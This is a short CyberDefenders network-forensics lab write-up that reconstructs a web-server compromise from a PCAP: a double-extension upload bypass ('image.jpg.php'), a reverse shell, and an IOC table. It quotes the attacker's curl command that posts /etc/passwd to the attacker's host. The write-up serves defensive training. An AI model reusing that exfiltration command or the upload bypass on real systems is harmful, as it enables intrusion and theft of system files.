# Title
WebStrike - Network Forensics

## Tools and Environment
Platform: Cyberdefenders
Tools: Wireshark in a simulated lab environment

## Context
A suspicious file was identified on a company web server, and the network team captured network traffic in the form of a PCAP file. 

## IOCs
| Attacker IP: 117.11.88.124
| User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
| Malicious File: image.jpg.php
| Upload Directory: /reviews/uploads
| C2 Port: 8080

## Attack Timeline
1. 2023-11-30 18:43:28 - Attacker IP: 117.11.88.124 from China browses the website normally.
2. 2023-11-30 18:43:46 - Attacker attempts to upload "image.php" but was rejected due to invalid file format.
3. 2023-11-30 18:44:18 - Attacker attempts to upload the same file except renames it to "image.jpg.php" to evade validation and file successfully uploads to /reviews/uploads.
4. 2023-11-30 18:44:52 - Victim server initiates SYN connection to attacker on port 8080 via reverse shell. 
5. 2023-11-30 18:46:08 - Attacker successfully exfiltrates /etc/passwd file contents using "curl -X POST -d /etc/passwd http://117.11.88.124:443/."

## Lessons Learned
1. Wireshark display filters, such as "http.request.method == POST" to zero in on suspicious activity since thats when the client uploads content to a server.
2. Following the pcap file to analyze and reconstruct the attack using Wireshark's follow HTTP and TCP stream. 
3. Weak security can be easily bypassed. For example, the attacker was able to upload the same file simply by renaming the file name to double extension ".jpg.php". Validation checks ought to be more granular.
   
